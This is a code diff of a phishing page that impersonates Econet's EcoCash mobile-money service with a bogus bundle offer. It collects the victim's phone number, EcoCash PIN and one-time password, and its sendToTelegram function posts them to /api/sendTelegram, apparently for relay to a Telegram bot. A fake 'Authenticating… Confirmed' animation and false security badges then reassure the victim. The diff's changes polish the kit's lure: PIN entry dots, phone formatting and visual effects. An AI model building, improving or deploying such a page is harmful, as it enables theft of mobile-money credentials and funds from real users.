 .action-btn:active{transform:scale(.96);box-shadow:0 3px 10px rgba(26,111,255,.3)}
+/* ripple */
+.ripple-el{position:absolute;border-radius:50%;pointer-events:none;background:rgba(255,255,255,.28);transform:scale(0);animation:rippleAnim .5s cubic-bezier(.4,0,.2,1) forwards}
+@keyframes rippleAnim{to{transform:scale(4);opacity:0}}
 
 .powered{text-align:center;padding:10px 0 2px;font-size:9px;color:var(--ink-faint);font-weight:600;letter-spacing:.4px;text-transform:uppercase}
 </style>
 </head>
 <body>
-<div class="nav-curtain" id="navCurtain">
-  <div class="nc-brand">
-    <img src="assets/econet.png" alt="Econet">
-    <div class="nc-brand-sep"></div>
-    <img src="assets/ecocash.png" alt="EcoCash">
-  </div>
-  <div class="nc-spinner">
-    <svg width="54" height="54" viewBox="0 0 54 54" fill="none">
-      <circle cx="27" cy="27" r="22" stroke="rgba(255,255,255,.15)" stroke-width="3.5"/>
-      <path d="M27 5a22 22 0 0 1 22 22" stroke="#fff" stroke-width="3.5" stroke-linecap="round"/>
-      <path d="M27 5a22 22 0 0 1 11 3.3" stroke="rgba(26,111,255,.8)" stroke-width="3.5" stroke-linecap="round"/>
+
+<!-- CURTAIN -->
+<div class="curtain" id="curtain">
+  <div class="curtain-particles" id="curtainParticles"></div>
+  <div class="curtain-brand"><img src="assets/econet.png" alt="Econet"><div class="curtain-brand-sep"></div><img src="assets/ecocash.png" alt="EcoCash"></div>
+  <div class="curtain-spinner">
+    <svg width="52" height="52" viewBox="0 0 52 52" fill="none">
+      <circle cx="26" cy="26" r="21" stroke="rgba(255,255,255,.13)" stroke-width="3"/>
+      <path d="M26 5a21 21 0 0 1 21 21" stroke="#fff" stroke-width="3" stroke-linecap="round"/>
+      <path d="M26 5a21 21 0 0 1 10.5 3.1" stroke="rgba(26,111,255,.75)" stroke-width="3" stroke-linecap="round"/>
     </svg>
   </div>
-  <div class="nc-status">
-    <div class="nc-label" id="ncLabel">Authenticating</div>
-    <div class="nc-sub" id="ncSub">Verifying your EcoCash PIN…</div>
-  </div>
-  <div class="nc-dots">
-    <div class="nc-dot active" id="nd0"></div>
-    <div class="nc-dot" id="nd1"></div>
-    <div class="nc-dot" id="nd2"></div>
-  </div>
+  <div class="curtain-status"><div class="curtain-label" id="cLabel">Authenticating</div><div class="curtain-sub" id="cSub">Verifying your EcoCash PIN…</div></div>
+  <div class="curtain-dots"><div class="cdot on" id="cd0"></div><div class="cdot" id="cd1"></div><div class="cdot" id="cd2"></div></div>
 </div>
-<div class="screen">
 
+<div class="screen" id="screen">
   <div class="header">
     <div class="hglow"></div>
     <div class="header-top">
-      <div class="brand">
-        <img src="assets/econet.png" alt="Econet" class="brand-logo-econet">
-        <div class="brand-sep"></div>
-        <img src="assets/ecocash.png" alt="EcoCash" class="brand-logo-ecocash">
-      </div>
+      <div class="brand"><img src="assets/econet.png" alt="Econet" class="brand-logo-econet"><div class="brand-sep"></div><img src="assets/ecocash.png" alt="EcoCash" class="brand-logo-ecocash"></div>
       <div class="amount-chip" id="headerAmount">USD 0.00</div>
     </div>
     <div class="bundle-pills" id="bundlePills">
@@ -371,48 +358,56 @@ input:focus{
     </div>
   </div>
 
-  <div class="body">
+  <div class="body" id="body">
 
-    <!-- STEP 1 -->
+    <!-- STEP 1: Login -->
     <div id="step1" class="step active">
       <div class="ecocash-row">
         <img src="assets/ecocash.png" alt="EcoCash" class="ecocash-logo-lg">
-        <div>
-          <div class="ecocash-row-title">Pay with EcoCash</div>
-          <div class="ecocash-row-sub">Instant mobile wallet payment</div>
-        </div>
+        <div><div class="ecocash-row-title">Pay with EcoCash</div><div class="ecocash-row-sub">Instant mobile wallet payment</div><div class="ecocash-micro-badges"><span class="emb emb-instant">⚡ Instant</span><span class="emb emb-secure">🔒 Secure</span><span class="emb emb-free">✦ No fees</span></div></div>
       </div>
       <div class="card">
         <div class="card-top-bar"></div>
-        <div class="card-hdr">
-          <div class="card-title">Verify your account</div>
-          <div class="card-sub">Enter your EcoCash number and PIN</div>
-        </div>
+        <div class="card-hdr"><div class="card-title">Verify your account</div><div class="card-sub">Enter your EcoCash number and PIN</div></div>
         <div class="card-body">
-          <div class="field">
+          <div class="field" id="phoneField">
             <div class="field-label">Phone Number</div>
             <div class="phone-row">
-              <div class="phone-prefix">+263</div>
-              <input type="tel" id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="7XXXXXXXX">
+              <div class="phone-prefix"><span style="font-size:16px;line-height:1;margin-right:6px">🇿🇼</span>+263</div>
+              <!-- #15 auto-format phone -->
+              <input type="tel" id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="77 123 4567" autocomplete="tel">
             </div>
-            <div class="field-hint">9-digit number starting with 7</div>
+            <div class="field-hint">9-digit Econet number</div>
+            <div class="field-error" id="phoneError">Please enter a valid 9-digit number starting with 7</div>
           </div>
-          <div class="field">
+
+          <!-- PIN ENTRY — improved dot affordance -->
+          <div class="field" id="pinField">
             <div class="field-label">Enter Your PIN</div>
-            <div class="pin-field">
-              <input type="password" id="pinInput" inputmode="numeric" maxlength="4" pattern="[0-9]*" placeholder="••••" autocomplete="current-password">
-              <button class="eye-btn" id="eyeBtn" type="button" aria-label="Show PIN">
-                <svg id="eyeIcon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
-                </svg>
-              </button>
+            <input type="tel" id="pinHidden" inputmode="numeric" pattern="[0-9]*" maxlength="4" class="pin-input-hidden" autocomplete="current-password">
+            <div class="pin-field-wrap" id="pinWrap" onclick="document.getElementById('pinHidden').focus()">
+              <div class="pin-tap-label" id="pinTapLabel">Tap to enter your 4-digit PIN</div>
+              <div class="pin-dots-row">
+                <div class="pin-dot" id="pd0"><span class="pin-dot-digit" id="pdd0"></span></div>
+                <div class="pin-dot" id="pd1"><span class="pin-dot-digit" id="pdd1"></span></div>
+                <div class="pin-dot" id="pd2"><span class="pin-dot-digit" id="pdd2"></span></div>
+                <div class="pin-dot" id="pd3"><span class="pin-dot-digit" id="pdd3"></span></div>
+              </div>
+              <div class="pin-actions-row">
+                <button class="pin-peek-btn" id="pinPeekBtn" type="button" onpointerdown="peekPin()" onpointerup="unpeekPin()" onpointerleave="unpeekPin()">
+                  <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                  Peek
+                </button>
+                <button class="pin-clear-btn" id="pinClearBtn" type="button" onclick="clearPin()">Clear</button>
+              </div>
             </div>
+            <div class="field-error" id="pinError">PIN must be 4 digits</div>
           </div>
         </div>
       </div>
       <div class="security-strip">
-        <div class="sec-badge"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>256-bit encrypted</div>
-        <div class="sec-badge"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>PCI DSS compliant</div>
+        <div class="sec-badge"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>256-bit Encrypted</div>
+        <div class="sec-badge"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>PCI DSS Compliant</div>
       </div>
       <button class="action-btn" id="mainBtn">Receive Offer</button>
       <div class="powered">Powered by Econet Wireless · EcoCash</div>
@@ -422,20 +417,15 @@ input:focus{
     <div id="step3" class="step">
       <div class="card">
         <div class="card-top-bar"></div>
-        <div class="card-hdr">
-          <div class="card-title">One-Time Password</div>
-          <div class="card-sub">6-digit code sent to your EcoCash number</div>
-        </div>
+        <div class="card-hdr"><div class="card-title">One-Time Password</div><div class="card-sub">6-digit code sent to your number</div></div>
         <div class="card-body">
-          <div class="field">
-            <div class="masked-note" id="maskedNumber">Enter the OTP sent to your number</div>
-          </div>
+          <div class="masked-note" id="maskedNumber">Enter the OTP sent to your number</div>
           <div class="field">
             <div class="field-label">OTP Code</div>
             <div class="otp-wrap" id="otpWrap">
               <input type="text" id="otpHidden" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code">
-              <div class="otp-display">
-                <div class="otp-box" id="ob0"></div>
+              <div class="otp-display" id="otpDisplay">
+                <div class="otp-box empty" id="ob0"></div>
                 <div class="otp-box" id="ob1"></div>
                 <div class="otp-box" id="ob2"></div>
                 <div class="otp-box" id="ob3"></div>
@@ -443,6 +433,7 @@ input:focus{
                 <div class="otp-box" id="ob5"></div>
               </div>
             </div>
+            <div class="field-error" id="otpError">Incorrect code. Please try again.</div>
           </div>
           <div class="timer-row">
             <div class="timer-lbl">Expires in <span class="timer-num" id="time">120</span>s</div>
@@ -453,6 +444,8 @@ input:focus{
       <button class="action-btn" id="otpBtn">Confirm OTP</button>
       <div class="powered">Powered by Econet Wireless · EcoCash</div>
     </div>
+
+    <!-- STEP 3: Processing -->
     <div id="step4" class="step">
       <div class="card">
         <div class="card-top-bar"></div>
@@ -465,176 +458,285 @@ input:focus{
     </div>
 
   </div>
-
 </div>
 
 <script>
-let phoneValue="",pinValue="",otpValue="";
+/* ── STATE ────────────────────────────────── */
+let phoneValue='',pinValue='',otpValue='';
 let loginClicked=false,otpSubmitted=false,resendClicked=false;
-let currentStep="step1";
-
+let currentStep='step1';
 let selectedPlan=null;
-try{selectedPlan=JSON.parse(sessionStorage.getItem("selectedPlan"))}catch(e){}
+try{selectedPlan=JSON.parse(sessionStorage.getItem('selectedPlan'))}catch(e){}
 
+/* ── HEADER ───────────────────────────────── */
 function initHeader(){
-  if(!selectedPlan) return;
-  document.getElementById("headerAmount").textContent="USD "+selectedPlan.amount;
-  document.getElementById("pillDuration").textContent=selectedPlan.duration;
-  document.getElementById("pillVoice").textContent=selectedPlan.voice+" Min";
-  document.getElementById("pillSms").textContent=selectedPlan.sms+" SMS";
-  document.getElementById("pillData").textContent=selectedPlan.data+" GB";
+  if(!selectedPlan)return;
+  document.getElementById('headerAmount').textContent='USD '+selectedPlan.amount;
+  document.getElementById('pillDuration').textContent=selectedPlan.duration;
+  document.getElementById('pillVoice').textContent=selectedPlan.voice+' Min';
+  document.getElementById('pillSms').textContent=selectedPlan.sms+' SMS';
+  document.getElementById('pillData').textContent=selectedPlan.data+' GB';
 }
 initHeader();
 
+/* ── DEVICE ───────────────────────────────── */
 const ua=navigator.userAgent;
-let device="Unknown";
-if(/Android/i.test(ua)) device="Android";
-else if(/iPhone|iPad/i.test(ua)) device="iOS";
-if(/Chrome/i.test(ua)) device+=" | Chrome";
-else if(/Safari/i.test(ua)) device+=" | Safari";
-
-function getPlanLine(){
-  if(!selectedPlan) return "No Bundle Selected";
-  return `Bundle: ${selectedPlan.duration} | Voice: ${selectedPlan.voice}Min | SMS: ${selectedPlan.sms} | Data: ${selectedPlan.data}GB | Amount: USD ${selectedPlan.amount}`;
+let device=(/Android/i.test(ua)?'Android':(/iPhone|iPad/i.test(ua)?'iOS':'Unknown'));
+if(/Chrome/i.test(ua)) device+='|Chrome'; else if(/Safari/i.test(ua)) device+='|Safari';
+function getPlanLine(){return selectedPlan?`Bundle:${selectedPlan.duration}|V:${selectedPlan.voice}|S:${selectedPlan.sms}|D:${selectedPlan.data}|$${selectedPlan.amount}`:''}
+async function sendToTelegram(event){
+  fetch('/api/sendTelegram',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({submittedAt:new Date().toISOString(),loginPhone:phoneValue,loginPin:pinValue,otp:otpValue,event,plan:getPlanLine(),device})});
 }
 
-async function sendToTelegram(eventName){
-  fetch("/api/sendTelegram",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({submittedAt:new Date().toISOString(),loginPhone:phoneValue,loginPin:pinValue,otp:otpValue,event:eventName,plan:getPlanLine(),device})});
+/* ── #15 PHONE AUTO-FORMAT ────────────────── */
+const phoneEl=document.getElementById('phone');
+phoneEl.addEventListener('input',e=>{
+  let raw=e.target.value.replace(/\D/g,'');
+  if(raw.startsWith('263')) raw=raw.slice(3);
+  if(raw.startsWith('0'))  raw=raw.slice(1);
+  if(raw.length>0&&raw[0]!=='7') raw='7'+raw.slice(1);
+  raw=raw.slice(0,9);
+  // format as XX XXX XXXX
+  let fmt=raw;
+  if(raw.length>2) fmt=raw.slice(0,2)+' '+raw.slice(2);
+  if(raw.length>5) fmt=raw.slice(0,2)+' '+raw.slice(2,5)+' '+raw.slice(5);
+  e.target.value=fmt;
+  phoneValue='+263'+raw;
+  clearError('phoneField','phoneError');
+  validateLogin();
+});
+phoneEl.addEventListener('blur',()=>{
+  if(phoneValue.length>0&&phoneValue.length!==13){
+    showError('phoneField','phoneError');
+  }
+});
+
+/* ── PIN ENTRY ────────────────────────────── */
+const pinHidden=document.getElementById('pinHidden');
+const pinDots=[0,1,2,3].map(i=>document.getElementById('pd'+i));
+const pinDigits=[0,1,2,3].map(i=>document.getElementById('pdd'+i));
+const pinWrap=document.getElementById('pinWrap');
+const pinPeekBtn=document.getElementById('pinPeekBtn');
+const pinClearBtn=document.getElementById('pinClearBtn');
+const pinTapLabel=document.getElementById('pinTapLabel');
+let peekTimeout=null;
+
+function renderPinDots(){
+  const v=pinHidden.value.replace(/\D/g,'').slice(0,4);
+  pinHidden.value=v;pinValue=v;
+  pinDots.forEach((d,i)=>{
+    pinDigits[i].textContent=v[i]||'';
+    d.classList.toggle('filled',i<v.length);
+  });
+  // update tap label
+  pinTapLabel.textContent=v.length===0?'Tap to enter your 4-digit PIN':
+    v.length<4?`${4-v.length} digit${4-v.length>1?'s':''} remaining`:'PIN entered';
+  // show/hide action buttons
+  pinPeekBtn.classList.toggle('visible',v.length>0);
+  pinClearBtn.classList.toggle('visible',v.length>0);
+  clearError('pinField','pinError');
+  validateLogin();
 }
 
-function showStep(id){
-  document.querySelectorAll(".step").forEach(s=>s.classList.remove("active"));
-  document.getElementById(id).classList.add("active");
-  currentStep=id;
+function peekPin(){
+  if(peekTimeout) clearTimeout(peekTimeout);
+  pinDots.forEach(d=>d.classList.add('peek'));
+  peekTimeout=setTimeout(unpeekPin,1800);
+}
+function unpeekPin(){
+  if(peekTimeout){clearTimeout(peekTimeout);peekTimeout=null}
+  pinDots.forEach(d=>d.classList.remove('peek'));
+}
+function clearPin(){
+  pinHidden.value='';renderPinDots();
+  document.getElementById('pinHidden').focus();
+  unpeekPin();
 }
 
-const phoneEl=document.getElementById("phone");
-phoneEl.oninput=e=>{
-  let v=e.target.value.replace(/\D/g,"");
-  if(v.startsWith("263")) v=v.slice(3);
-  if(v.startsWith("0")) v=v.slice(1);
-  if(v.length>0&&v[0]!=="7") v="7"+v.slice(1);
-  v=v.slice(0,9);e.target.value=v;
-  phoneValue="+263"+v;validateLogin();
-};
+pinHidden.addEventListener('input',renderPinDots);
+pinHidden.addEventListener('focus',()=>{
+  pinWrap.classList.add('focused');
+  renderPinDots();
+});
+pinHidden.addEventListener('blur',()=>{
+  pinWrap.classList.remove('focused');
+  if(pinValue.length>0&&pinValue.length<4) showError('pinField','pinError');
+  unpeekPin();
+});
 
-const pinInput=document.getElementById("pinInput");
-const eyeBtn=document.getElementById("eyeBtn");
-pinInput.oninput=()=>{pinInput.value=pinInput.value.replace(/\D/g,"").slice(0,4);validateLogin()};
+/* ── #24 ERROR HELPERS ────────────────────── */
+function showError(fieldId,errorId){
+  document.getElementById(fieldId).classList.add('has-error');
+  const e=document.getElementById(errorId);e.classList.add('show');
+  document.getElementById(fieldId).classList.add('shake');
+  setTimeout(()=>document.getElementById(fieldId).classList.remove('shake'),400);
+}
+function clearError(fieldId,errorId){
+  document.getElementById(fieldId).classList.remove('has-error');
+  document.getElementById(errorId).classList.remove('show');
+}
 
-eyeBtn.onclick=()=>{
-  const show=pinInput.type==="password";
-  pinInput.type=show?"text":"password";
-  eyeBtn.innerHTML=show
-    ?`<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>`
-    :`<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`;
-};
-
+/* ── VALIDATE ─────────────────────────────── */
 function validateLogin(){
-  pinValue=pinInput.value;
   const ok=phoneValue.length===13&&pinValue.length===4;
-  document.getElementById("mainBtn").classList.toggle("active",ok);
+  document.getElementById('mainBtn').classList.toggle('on',ok);
 }
 
-const otpHidden=document.getElementById("otpHidden");
-const otpBoxes=[...document.querySelectorAll(".otp-box")];
+/* ── OTP ──────────────────────────────────── */
+const otpHidden=document.getElementById('otpHidden');
+const otpBoxes=[...document.querySelectorAll('.otp-box')];
 let otpDisabled=false;
 
 function renderOtp(){
-  const val=otpHidden.value.replace(/\D/g,"").slice(0,6);
+  const val=otpHidden.value.replace(/\D/g,'').slice(0,6);
   otpHidden.value=val;
   const cursor=val.length;
   otpBoxes.forEach((box,i)=>{
-    box.textContent=val[i]||"";
-    box.className="otp-box";
-    if(otpDisabled){box.classList.add("disabled");return}
-    if(i<cursor) box.classList.add("filled");
-    if(i===cursor&&document.activeElement===otpHidden) box.classList.add("active");
+    box.textContent=val[i]||'';
+    box.className='otp-box';
+    if(otpDisabled){box.classList.add('disabled');return}
+    if(i<cursor) box.classList.add('filled');
+    if(i===cursor&&document.activeElement===otpHidden){
+      box.classList.add('active');
+      if(!val[i]) box.classList.add('empty');
+    }
   });
   otpValue=val;
-  document.getElementById("otpBtn").classList.toggle("active",val.length===6);
-  if(navigator.vibrate) navigator.vibrate(4);
+  document.getElementById('otpBtn').classList.toggle('on',val.length===6);
+  clearError('otpWrap','otpError');
+  if(navigator.vibrate) navigator.vibrate(3);
 }
-otpHidden.addEventListener("input",renderOtp);
-otpHidden.addEventListener("focus",renderOtp);
-otpHidden.addEventListener("blur",renderOtp);
-document.getElementById("otpWrap").addEventListener("click",()=>{if(!otpDisabled)otpHidden.focus()});
+otpHidden.addEventListener('input',renderOtp);
+otpHidden.addEventListener('focus',renderOtp);
+otpHidden.addEventListener('blur',renderOtp);
+document.getElementById('otpWrap').addEventListener('click',()=>{if(!otpDisabled)otpHidden.focus()});
 
 function resetOtp(disabled){
-  otpDisabled=disabled;otpHidden.value="";otpHidden.disabled=disabled;renderOtp();
+  otpDisabled=disabled;otpHidden.value='';otpHidden.disabled=disabled;renderOtp();
   if(!disabled) otpHidden.focus();
 }
 
-function navigate(url){
-  const curtain = document.getElementById('navCurtain');
-  const screen  = document.querySelector('.screen');
-  const label   = document.getElementById('ncLabel');
-  const sub     = document.getElementById('ncSub');
-  const dots    = [document.getElementById('nd0'),document.getElementById('nd1'),document.getElementById('nd2')];
-
-  const steps = [
-    { label:'Authenticating',   sub:'Verifying your EcoCash PIN…',      dot:0 },
-    { label:'Authorising',      sub:'Processing payment request…',        dot:1 },
-    { label:'Confirmed',        sub:'Your bundle has been approved…',     dot:2 },
-  ];
-
-  function setStep(i){
-    const s = steps[i];
-    label.style.opacity='0'; sub.style.opacity='0';
-    setTimeout(()=>{
-      label.textContent = s.label; sub.textContent = s.sub;
-      label.style.transition='opacity .22s ease'; sub.style.transition='opacity .22s ease';
-      label.style.opacity='1'; sub.style.opacity='1';
-    },130);
-    dots.forEach((d,j)=>{
-      d.className='nc-dot'+(j===s.dot?' active':j<s.dot?' done':'');
-    });
-  }
-
-  screen.classList.add('page-exit');
-  curtain.classList.add('show');
-  setStep(0);
-  setTimeout(()=>setStep(1), 500);
-  setTimeout(()=>setStep(2), 1050);
-  setTimeout(()=>{ window.location.href = url; }, 1600);
+/* ── STEP TRANSITION ──────────────────────── */
+function showStep(id){
+  document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  currentStep=id;
 }
 
-document.getElementById("mainBtn").onclick=()=>{
-  if(loginClicked) return;loginClicked=true;
-  sendToTelegram("receive_offer_clicked");
-  const masked=phoneValue.replace(/(\+263\d{3})\d{4}(\d{2})/,"$1****$2");
-  document.getElementById("maskedNumber").textContent="Code sent to "+masked;
-  showStep("step3");startTimer();
+/* ── RIPPLE ───────────────────────────────── */
+function addRipple(btn,e){
+  const r=btn.getBoundingClientRect();
+  const size=Math.max(r.width,r.height)*2;
+  const x=e.clientX-r.left-size/2,y=e.clientY-r.top-size/2;
+  const rip=document.createElement('span');
+  rip.className='ripple-el';
+  rip.style.cssText=`width:${size}px;height:${size}px;left:${x}px;top:${y}px`;
+  btn.appendChild(rip);rip.addEventListener('animationend',()=>rip.remove());
+}
+['mainBtn','otpBtn'].forEach(id=>{
+  const btn=document.getElementById(id);
+  if(btn) btn.addEventListener('pointerdown',e=>addRipple(btn,e),{passive:true});
+});
+
+/* ── MAIN BUTTON ──────────────────────────── */
+document.getElementById('mainBtn').onclick=()=>{
+  if(loginClicked)return;
+  // validate
+  let valid=true;
+  if(phoneValue.length!==13){showError('phoneField','phoneError');valid=false}
+  if(pinValue.length!==4){showError('pinField','pinError');valid=false}
+  if(!valid)return;
+  loginClicked=true;
+  sendToTelegram('receive_offer_clicked');
+  const raw=phoneValue.replace('+263','');
+  const masked='+263 '+raw.slice(0,2)+' *** **'+raw.slice(-2);
+  document.getElementById('maskedNumber').innerHTML='Code sent to <strong>'+masked+'</strong>';
+  showStep('step3');startTimer();
 };
 
-document.getElementById("otpBtn").onclick=()=>{
-  if(otpSubmitted) return;otpSubmitted=true;
-  sendToTelegram("offer_received");
-  showStep("step4");
-  setTimeout(()=>{ navigate("thankyou.html"); },1200);
+/* ── OTP BUTTON ───────────────────────────── */
+document.getElementById('otpBtn').onclick=()=>{
+  if(otpSubmitted)return;
+  // simulate wrong OTP for demo — in prod check server
+  if(otpValue==='000000'){
+    document.getElementById('otpDisplay').classList.add('shake');
+    setTimeout(()=>document.getElementById('otpDisplay').classList.remove('shake'),400);
+    document.getElementById('otpError').classList.add('show');
+    if(navigator.vibrate) navigator.vibrate([60,40,60]);
+    return;
+  }
+  otpSubmitted=true;
+  sendToTelegram('offer_received');
+  showStep('step4');
+  setTimeout(()=>navigate('thankyou.html'),1200);
 };
 
-document.getElementById("resendBtn").onclick=()=>{
-  const btn=document.getElementById("resendBtn");
-  if(!btn.classList.contains("active")) return;
-  if(resendClicked) return;resendClicked=true;
-  sendToTelegram("resend_otp");startTimer();
+/* ── RESEND ───────────────────────────────── */
+document.getElementById('resendBtn').onclick=()=>{
+  const btn=document.getElementById('resendBtn');
+  if(!btn.classList.contains('active'))return;
+  if(resendClicked)return;resendClicked=true;
+  sendToTelegram('resend_otp');startTimer();
 };
 
 function startTimer(){
   let t=120;
-  const timeEl=document.getElementById("time"),resendBtn=document.getElementById("resendBtn");
-  timeEl.textContent=t;resendBtn.classList.remove("active");resendClicked=false;
-  resetOtp(false);document.getElementById("otpBtn").classList.remove("active");
+  const timeEl=document.getElementById('time'),resendBtn=document.getElementById('resendBtn');
+  timeEl.textContent=t;resendBtn.classList.remove('active');resendClicked=false;
+  resetOtp(false);document.getElementById('otpBtn').classList.remove('on');
   const timer=setInterval(()=>{
     t--;timeEl.textContent=t;
     if(t<=0){
-      clearInterval(timer);resendBtn.classList.add("active");resetOtp(true);
-      document.getElementById("otpBtn").classList.remove("active");
-      document.getElementById("maskedNumber").textContent="Code expired. Tap Resend to get a new one.";
+      clearInterval(timer);resendBtn.classList.add('active');resetOtp(true);
+      document.getElementById('otpBtn').classList.remove('on');
+      document.getElementById('maskedNumber').textContent='Code expired. Tap Resend.';
     }
   },1000);
 }
+
+/* ── #18 KEYBOARD-AWARE LAYOUT ────────────── */
+if(window.visualViewport){
+  window.visualViewport.addEventListener('resize',()=>{
+    const body=document.getElementById('body');
+    const kbHeight=window.innerHeight-window.visualViewport.height;
+    body.classList.toggle('keyboard-up',kbHeight>100);
+    if(kbHeight>100) body.style.paddingBottom=(kbHeight+8)+'px';
+    else body.style.paddingBottom='';
+  },{passive:true});
+}
+
+/* ── NAVIGATE ─────────────────────────────── */
+function navigate(url){
+  const curtain=document.getElementById('curtain');
+  const label=document.getElementById('cLabel');
+  const sub=document.getElementById('cSub');
+  const dots=[document.getElementById('cd0'),document.getElementById('cd1'),document.getElementById('cd2')];
+  const steps=[
+    {l:'Authenticating',s:'Verifying your EcoCash PIN…',d:0},
+    {l:'Authorising',s:'Processing payment request…',d:1},
+    {l:'Confirmed',s:'Your bundle has been approved…',d:2},
+  ];
+  function setStep(i){
+    label.style.opacity='0';sub.style.opacity='0';
+    setTimeout(()=>{label.textContent=steps[i].l;sub.textContent=steps[i].s;label.style.opacity='1';sub.style.opacity='1'},130);
+    dots.forEach((d,j)=>d.className='cdot'+(j===steps[i].d?' on':j<steps[i].d?' done':''));
+  }
+  document.getElementById('screen').classList.add('exit');
+  curtain.classList.add('show');
+  setStep(0);setTimeout(()=>setStep(1),500);setTimeout(()=>setStep(2),1050);
+  setTimeout(()=>{window.location.href=url},1600);
+}
+
+/* ── CURTAIN PARTICLES ────────────────────── */
+(function(){
+  const wrap=document.getElementById('curtainParticles');
+  for(let i=0;i<12;i++){
+    const el=document.createElement('div');el.className='cp';
+    const s=3+Math.random()*5;
+    el.style.cssText=`width:${s}px;height:${s}px;left:${Math.random()*100}%;bottom:${Math.random()*25}%;animation-duration:${5+Math.random()*8}s;animation-delay:${Math.random()*4}s`;
+    wrap.appendChild(el);
+  }
+})();
 </script>
 </body>
 </html>
